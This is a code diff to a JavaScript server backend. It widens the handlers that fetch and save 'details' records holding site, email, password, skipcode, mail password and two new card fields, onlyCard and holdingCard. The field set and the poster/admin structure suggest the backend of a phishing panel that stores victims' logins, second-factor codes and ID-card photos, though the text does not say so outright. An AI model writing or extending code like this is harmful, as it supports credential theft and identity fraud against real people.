@@ -225,7 +225,7 @@ export const info_get = async (req, res) => {
                     populate: {
                         path: 'details',
                         model: 'Info',
-                        select: 'site email password skipcode mail mailPass',
+                        select: 'site email password skipcode mail mailPass onlyCard holdingCard',
                     }
                 }).sort({ createdAt: -1 })
                 .select('posters').populate('posters', 'username password links ')
@@ -234,7 +234,7 @@ export const info_get = async (req, res) => {
 
         }
 
-        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode').sort({ createdAt: -1 })
+        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
         return res.status(200).json({ poster: poster })
     } catch (e) {
         res.status(400).json({ e: "error" })
@@ -1040,7 +1040,7 @@ export const update_many =  (req, res) => {
 export const add_data_checnge = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail, mailPass } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail, mailPass,onlyCard,holdingCard } = req.body
     try {
         const userFound = await User.findOne({ adminId: adminId })
 
@@ -1051,8 +1051,8 @@ export const add_data_checnge = async (req, res) => {
                 site, email, password, skipcode,
                 username,passcode,mail,mailPass,
                 poster: posterId,
-                root: posterFound._id
-
+                root: posterFound._id,
+                onlyCard,holdingCard
 
             })
             posterFound.details.push(info._id)
